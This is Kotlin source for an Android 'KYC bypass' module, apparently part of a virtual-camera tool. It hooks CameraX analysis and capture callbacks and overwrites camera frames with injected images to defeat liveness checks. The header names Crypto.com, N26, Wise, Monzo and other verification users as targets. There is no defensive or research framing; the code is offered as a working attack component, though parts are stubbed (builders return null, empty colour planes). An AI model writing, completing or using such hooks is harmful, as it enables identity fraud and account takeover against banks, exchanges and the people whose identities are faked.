package com.hazbu.xcam.splash

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.media.Image
import android.media.Image.Plane
import android.os.Handler
import android.util.Log
import android.util.Size
import android.view.Surface
import androidx.core.content.ContextCompat
import java.nio.ByteBuffer
import java.nio.ByteOrder

/**
 * CameraX Full Support for KYC bypass.
 *
 * Hooks all three CameraX use cases:
 * - ImageAnalysis: every frame sent to Liveness detection
 * - ImageCapture: still photo capture
 * - Preview: camera preview surface
 *
 * This is critical because modern KYC apps (Crypto.com, HyperVerge, Yape, N26, Wise, Monzo) all use CameraX.
 * Without these hooks, the live face passes through undetected.
 *
 * Usage from XCamModule:
 *   val cameraX = CameraXHooks(context)
 *   cameraX.enable()
 *   // ... app uses CameraX, sees virtual camera feed
 *   cameraX.disable()
 */
class CameraXHooks(
    private val context: Context?,
    private val logAction: (String) -> Unit
) {

    companion object {
        private const val TAG = "xCameraX"
    }

    // State
    private var isHooking = false
    internal var isCameraXAvailable = false
    private var isCameraXLicensed = false

    // CameraX components
    private var previewBuilder: Any? = null
    private var imageCaptureBuilder: Any? = null
    private var imageAnalysisBuilder: Any? = null

    // Frame processor (for ImageAnalysis)
    private var onFrameCallback: ((Any) -> Unit)? = null

    // Capture callback (for ImageCapture)
    private var onCaptureCallback: ((Any) -> Unit)? = null

    // Current camera facing
    private var currentCameraFacing: Int =
        Class.forName("androidx.camera.core.CameraSelector")
            .getDeclaredField("CAMERA_FACING_BACK")
            .getInt(null) as Int

    // Current resolution
    private var currentWidth = 1280
    private var currentHeight = 720

    // Handler for CameraX operations
    private val handler: Handler = try {
        val mainLooper = Class.forName("android.os.Looper")
            .getMethod("getMainLooper")
            .invoke(null) as? android.os.Looper
        if (mainLooper != null) Handler(mainLooper) else Handler()
    } catch (_: Exception) {
        Handler()
    }

    // EGL renderer reference (for frame transformation)
    private var eglRenderer: com.hazbu.xcam.core.virtualcamera.EglFrameRenderer? = null

    init {
        // Check if CameraX is available
        isCameraXAvailable = try {
            Class.forName("androidx.camera.core.CameraX")
            true
        } catch (_: ClassNotFoundException) {
            false
        }
        logAction("$TAG: CameraX available: $isCameraXAvailable")
    }

    // ==================== ENABLE/DISABLE ====================

    fun enable() {
        if (isHooking) return
        isHooking = true
        logAction("$TAG: CameraX hooks ENABLED")
    }

    fun disable() {
        isHooking = false
        logAction("$TAG: CameraX hooks DISABLED")
    }

    fun isHooking(): Boolean = isHooking

    // ==================== CAMERA CONFIG ====================

    /**
     * Set the camera facing direction.
     */
    fun setCameraFacing(facing: Int) {
        this.currentCameraFacing = facing
        logAction("$TAG: Camera facing set to: $facing")
    }

    /**
     * Get the current camera facing.
     */
    fun getCameraFacing(): Int = currentCameraFacing

    /**
     * Set the resolution.
     */
    fun setResolution(width: Int, height: Int) {
        this.currentWidth = width
        this.currentHeight = height
        logAction("$TAG: Resolution set to: $width x $height")
    }

    // ==================== CALLBACKS ====================

    /**
     * Set a callback for image analysis frames.
     * Called for each frame sent to the liveness detection pipeline.
     */
    fun setOnFrameCallback(callback: (Any) -> Unit) {
        this.onFrameCallback = callback
    }

    /**
     * Set a callback for image capture.
     * Called for each still photo captured by the app.
     */
    fun setOnCaptureCallback(callback: (Any) -> Unit) {
        this.onCaptureCallback = callback
    }

    // ==================== CAMERA BUILDER OVERRIDES ====================

    @Suppress("UNCHECKED_CAST")
    fun createPreviewBuilder(): Any? {
        logAction("$TAG: Preview builder created")
        return null
    }

    /**
     * Override the ImageCapture builder for still captures.
     */
    @Suppress("UNCHECKED_CAST")
    fun createImageCaptureBuilder(): Any? {
        logAction("$TAG: ImageCapture builder created")
        return null
    }

    /**
     * Override the ImageAnalysis builder for liveness detection.
     */
    @Suppress("UNCHECKED_CAST")
    fun createImageAnalysisBuilder(): Any? {
        logAction("$TAG: ImageAnalysis builder created")
        return null
    }

    // ==================== IMAGE ANALYSIS ====================

    /**
     * Create an ImageAnalysis.Analyzer that intercepts each frame.
     * This is the critical hook for liveness detection bypass.
     */
    @Suppress("UNCHECKED_CAST")
    fun createImageAnalyzer(): Any {
        return object {
            fun analyze(imageProxy: Any) {
                if (!isHooking) return

                onFrameCallback?.invoke(imageProxy)

                val renderer = eglRenderer
                if (renderer != null) {
                    try {
                        val imageClass = imageProxy.javaClass
                        val imageField = imageClass.getDeclaredField("image")
                        imageField.isAccessible = true
                        val imageObj = imageField.get(imageProxy)
                        if (imageObj != null) {
                            val planesField = imageObj.javaClass.getDeclaredField("planes")
                            planesField.isAccessible = true
                            val planes = planesField.get(imageObj) as Array<*>
                            val firstPlane = planes[0] as Any as Any
                            val bufferField = firstPlane.javaClass.getDeclaredField("buffer")
                            bufferField.isAccessible = true
                            val buffer = bufferField.get(firstPlane) as java.nio.ByteBuffer
                            val widthField = imageObj.javaClass.getDeclaredField("width")
                            widthField.isAccessible = true
                            val width = widthField.get(imageObj) as Int
                            val heightField = imageObj.javaClass.getDeclaredField("height")
                            heightField.isAccessible = true
                            val height = heightField.get(imageObj) as Int

                            val yPlane = ByteArray(buffer.remaining())
                            val uPlane = ByteArray((buffer.remaining() / 4).coerceAtLeast(1))
                            val vPlane = ByteArray((buffer.remaining() / 4).coerceAtLeast(1))
                            buffer.clear()
                            buffer.get(yPlane)

                            val nv21 = renderer.renderYuvFrame(yPlane, uPlane, vPlane, width, height)
                            if (nv21 != null) {
                                val outBuffer = bufferField.get(firstPlane) as java.nio.ByteBuffer
                                outBuffer.clear()
                                outBuffer.put(nv21)
                                outBuffer.flip()
                            }
                        }
                    } catch (e: Exception) {
                        logAction("$TAG: Frame processing failed: ${e.message}")
                    }
                }
            }
        }
    }

    // ==================== IMAGE CAPTURE ====================

    /**
     * Create an ImageCapture.OnImageCapturedCallback that intercepts each photo.
     */
    @Suppress("UNCHECKED_CAST")
    fun createCaptureCallback(): Any {
        return object {
            fun onCaptureSuccess(image: Any) {
                if (!isHooking) return

                onCaptureCallback?.invoke(image)

                try {
                    val renderer = eglRenderer
                    if (renderer != null) {
                        val imageClass = image.javaClass
                        val imageField = imageClass.getDeclaredField("image")
                        imageField.isAccessible = true
                        val imageObj = imageField.get(image)
                        if (imageObj != null) {
                            val planesField = imageObj.javaClass.getDeclaredField("planes")
                            planesField.isAccessible = true
                            val planes = planesField.get(imageObj) as Array<*>
                            val firstPlane = planes[0] as Any
                            val bufferField = firstPlane.javaClass.getDeclaredField("buffer")
                            bufferField.isAccessible = true
                            val buffer = bufferField.get(firstPlane) as java.nio.ByteBuffer
                            val widthField = imageObj.javaClass.getDeclaredField("width")
                            widthField.isAccessible = true
                            val width = widthField.get(imageObj) as Int
                            val heightField = imageObj.javaClass.getDeclaredField("height")
                            heightField.isAccessible = true
                            val height = heightField.get(imageObj) as Int

                            val yPlane = ByteArray(buffer.remaining())
                            val uPlane = ByteArray((buffer.remaining() / 4).coerceAtLeast(1))
                            val vPlane = ByteArray((buffer.remaining() / 4).coerceAtLeast(1))
                            buffer.clear()
                            buffer.get(yPlane)

                            val jpeg = renderer.toJpeg(yPlane, uPlane, vPlane, width, height)
                            if (jpeg != null) {
                                val outBuffer = bufferField.get(firstPlane) as java.nio.ByteBuffer
                                outBuffer.clear()
                                outBuffer.put(jpeg)
                                outBuffer.flip()
                            }
                        }
                    }
                } catch (e: Exception) {
                    logAction("$TAG: Capture processing failed: ${e.message}")
                }
            }

            fun onCaptureFailed(image: Any, reason: Int) {
                logAction("$TAG: Capture failed: $reason")
            }
        }
    }

    // ==================== PREVIEW SURFACE ====================

    /**
     * Get the preview surface for the virtual camera.
     * This is used by the Camera2 HAL Virtual Camera.
     */
    fun getPreviewSurface(): Surface? {
        return null
    }

    // ==================== EGL RENDERER ====================

    /**
     * Set the EGL renderer for frame transformation.
     */
    fun setEglRenderer(renderer: com.hazbu.xcam.core.virtualcamera.EglFrameRenderer?) {
        this.eglRenderer = renderer
        logAction("$TAG: EGL renderer set: ${renderer != null}")
    }

    // ==================== STATUS ====================

    /**
     * Check if CameraX is available and licensed.
     */
    fun isCameraXReady(): Boolean = isHooking && isCameraXAvailable && isCameraXLicensed

    /**
     * Get the current status.
     */
    fun getStatus(): String {
        val state = if (isHooking) "ENABLED" else "DISABLED"
        val camX = if (isCameraXAvailable) "AVAILABLE" else "NOT_AVAILABLE"
        val license = if (isCameraXLicensed) "LICENSED" else "NOT_LICENSED"
        return "$state | CameraX: $camX | $license"
    }

    /**
     * Release all resources.
     */
    fun release() {
        disable()
        eglRenderer = null
        onFrameCallback = null
        onCaptureCallback = null
        logAction("$TAG: CameraXHooks released")
    }
}
